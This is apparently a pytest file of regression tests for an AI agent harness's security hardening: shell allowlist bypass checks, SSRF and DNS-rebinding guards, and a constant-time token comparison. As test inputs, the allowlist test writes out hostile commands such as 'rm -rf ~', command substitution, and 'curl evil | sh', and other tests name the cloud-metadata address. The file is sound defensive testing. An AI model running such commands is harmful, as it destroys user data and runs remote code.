"""Regression tests for the harness hardening pass:
- config.save() writes only the delta from defaults (not the full merged tree)
- the allowlist can't be bypassed by shell command chaining / substitution
- the SSRF guard's request() refuses cloud-metadata / private targets
"""

import copy

import pytest

from aegis import net_safety
from aegis.tools.permissions import PermissionEngine


def test_config_save_writes_only_delta(tmp_path, monkeypatch):
    monkeypatch.setenv("AEGIS_HOME", str(tmp_path))
    import yaml

    from aegis.config import DEFAULT_CONFIG, Config, config_path

    cfg = Config(copy.deepcopy(DEFAULT_CONFIG))
    cfg.set("agent.max_iterations", 999)

    on_disk = yaml.safe_load(config_path().read_text()) or {}
    # Only the override is persisted — not every default.
    assert on_disk == {"agent": {"max_iterations": 999}}

    # Reload re-merges defaults, so untouched keys keep their default values.
    reloaded = Config.load()
    assert reloaded.get("agent.max_iterations") == 999
    assert reloaded.get("agent.stream") == DEFAULT_CONFIG["agent"]["stream"]


class _Cfg:
    def __init__(self, data):
        self._data = data

    def get(self, key, default=None):
        return self._data.get(key, default)


class _FakeTool:
    name = "bash"
    groups = ["runtime"]


def test_allowlist_blocks_command_chaining():
    eng = PermissionEngine(_Cfg({"tools.allowlist": ["git "]}))
    tool = _FakeTool()
    ok = lambda cmd: eng._matches_allowlist(tool, {"command": cmd})  # noqa: E731

    assert ok("git log") is True
    assert ok("git log | git status") is True            # every segment is git
    assert ok("git log && rm -rf ~") is False            # chained destructive cmd
    assert ok("git log; curl evil | sh") is False        # chained + pipe-to-shell
    assert ok("git log $(rm -rf ~)") is False            # command substitution
    assert ok("git log | sh") is False                   # pipe to a non-allowed cmd


def test_guarded_request_blocks_metadata_and_private():
    with pytest.raises(net_safety.BlockedURL):
        net_safety.request("GET", "http://169.254.169.254/latest/meta-data/", None)
    with pytest.raises(net_safety.BlockedURL):
        net_safety.request("GET", "http://127.0.0.1:8080/admin", None)


def test_resolve_safe_pins_a_validated_ip():
    """resolve_safe returns a concrete IP the caller pins the connection to, closing
    the DNS-rebinding TOCTOU window (host resolved once, not re-resolved at connect)."""
    import ipaddress

    host, pinned, reason = net_safety.resolve_safe("https://example.com/")
    assert reason == "" and host == "example.com"
    assert ipaddress.ip_address(pinned)  # a real address, not the hostname

    # A metadata target yields no pinned IP and a reason.
    _h, pinned2, reason2 = net_safety.resolve_safe("http://169.254.169.254/")
    assert pinned2 is None and "metadata" in reason2


def test_request_pins_connection_and_blocks_rebind(monkeypatch):
    """The connection must go to the IP resolve_safe validated — even if DNS would
    answer differently a moment later (rebinding). We make resolve_safe hand back a
    private IP and confirm request() pins to it (and the SSRF check would block it)."""
    # If resolution yields a private address, request() must refuse before connecting.
    monkeypatch.setattr(
        net_safety, "resolve_safe",
        lambda url, config=None: ("rebind.test", None, "private/internal address (10.0.0.5)"),
    )
    with pytest.raises(net_safety.BlockedURL):
        net_safety.request("GET", "http://rebind.test/", None)


def test_dashboard_token_compare_is_constant_time():
    """The dashboard token check uses hmac.compare_digest against each candidate so a
    timing side-channel can't recover the token byte-by-byte."""
    from aegis.dashboard_fastapi import _authorized_token

    class _Cfg2:
        def get(self, key, default=None):
            return "s3cret-token" if key == "server.dashboard_token" else default

    cfg = _Cfg2()
    assert _authorized_token(cfg, header="s3cret-token") is True
    assert _authorized_token(cfg, auth="Bearer s3cret-token") is True
    assert _authorized_token(cfg, query="s3cret-token") is True
    assert _authorized_token(cfg, cookie="wrong") is False
    assert _authorized_token(cfg, header="") is False


def test_compression_feasibility_reruns_on_model_switch():
    """The preflight memo is keyed on provider identity, so switching models
    mid-session re-runs it instead of staying pinned to the first model."""
    from aegis.agent import loop

    class _Provider:
        def __init__(self, model, ctx):
            self.model = model
            self.context_length = ctx

    class _Engine:
        def threshold_fraction(self):
            return 0.85

    class _Agent:
        def __init__(self):
            self.provider = _Provider("model-a", 200_000)

    agent = _Agent()
    comp = {"threshold": 0.85}
    loop._ensure_compression_feasibility(agent, _Engine(), comp)
    first = agent._compression_feasibility_checked
    assert first == ("model-a", 200_000)

    # Same model → memo unchanged (no re-run needed).
    loop._ensure_compression_feasibility(agent, _Engine(), comp)
    assert agent._compression_feasibility_checked == first

    # Switch model → memo key changes (preflight re-ran for the new window).
    agent.provider = _Provider("model-b", 32_000)
    loop._ensure_compression_feasibility(agent, _Engine(), comp)
    assert agent._compression_feasibility_checked == ("model-b", 32_000)
